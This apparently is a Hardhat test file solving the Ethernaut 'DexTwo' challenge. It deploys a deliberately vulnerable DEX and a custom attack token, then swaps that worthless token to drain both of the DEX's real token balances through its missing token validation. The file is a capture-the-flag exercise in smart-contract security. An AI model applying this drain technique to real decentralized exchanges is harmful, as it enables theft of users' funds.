const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("DexTwo", function () {
  async function deployOneYearLockFixture() {
    const [owner, otherAccount] = await ethers.getSigners();
    const DexTwoContract = await ethers.getContractFactory("DexTwo");
    const DexTwo = await DexTwoContract.deploy();
    await DexTwo.deployed();
    const Token1Contract = await ethers.getContractFactory("SwappableTokenTwo");
    const InitialAmount = ethers.utils.parseEther("20");
    const Token1 = await Token1Contract.deploy(
      DexTwo.address,
      "SMS",
      "sms",
      InitialAmount
    );
    await Token1.deployed();
    const Token2Contract = await ethers.getContractFactory("SwappableTokenTwo");
    const Token2 = await Token2Contract.deploy(
      DexTwo.address,
      "SG",
      "sg",
      InitialAmount
    );
    await Token2.deployed();
    const AttackTokenContract = await ethers.getContractFactory("AttackDexTwo");
    const AttackToken = await AttackTokenContract.deploy(
      ethers.utils.parseEther("100")
    );
    await AttackToken.deployed();

    return {
      owner,
      otherAccount,
      DexTwo,
      Token1,
      Token2,
      InitialAmount,
      AttackToken,
    };
  }

  describe("Deployment", function () {
    it("Should Manipulate the DexTwo", async function () {
      const {
        owner,
        otherAccount,
        DexTwo,
        Token1,
        Token2,
        AttackToken,
        InitialAmount,
      } = await loadFixture(deployOneYearLockFixture);
      await DexTwo.setTokens(Token1.address, Token2.address);
      const balance = await AttackToken.balanceOf(owner.address);
      console.log(balance);
      await AttackToken.transfer(DexTwo.address, ethers.utils.parseEther("20"));
      await AttackToken.approve(DexTwo.address, ethers.utils.parseEther("80"));
      await DexTwo.swap(AttackToken.address, Token1.address, InitialAmount);
      await DexTwo.swap(AttackToken.address, Token2.address, InitialAmount);
      const Token1Balance = await DexTwo.balanceOf(
        Token1.address,
        DexTwo.address
      );
      const Token2Balance = await DexTwo.balanceOf(
        Token2.address,
        DexTwo.address
      );
      console.log(Token1Balance, Token2Balance);
    });
  });
});
